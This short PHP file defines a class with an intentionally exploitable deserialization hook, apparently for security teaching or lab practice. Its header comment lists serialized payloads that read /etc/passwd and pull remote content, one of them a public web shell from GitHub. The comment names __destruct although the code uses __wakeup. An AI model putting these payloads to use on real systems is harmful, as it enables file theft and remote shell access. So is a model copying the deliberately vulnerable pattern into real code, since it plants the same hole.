<?php

namespace Components;

/*
 * PHP Class with an exploitable __destruct method
 * Payload example LFI: O:15:"Components\File":1:{s:8:"filename";s:31:"../../../../../../../etc/passwd";}
 * Payload example RFI: O:15:"Components\File":1:{s:8:"filename";s:22:"http://www.example.com";}
 * Payload example RFI remote shell: O:15:"Components\File":1:{s:8:"filename";s:68:"https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php";}
 */
class File
{
    public $filename;

    public function __wakeup()
    {
        if (isset($this->filename)) {
            echo file_get_contents($this->filename);
        }
    }
}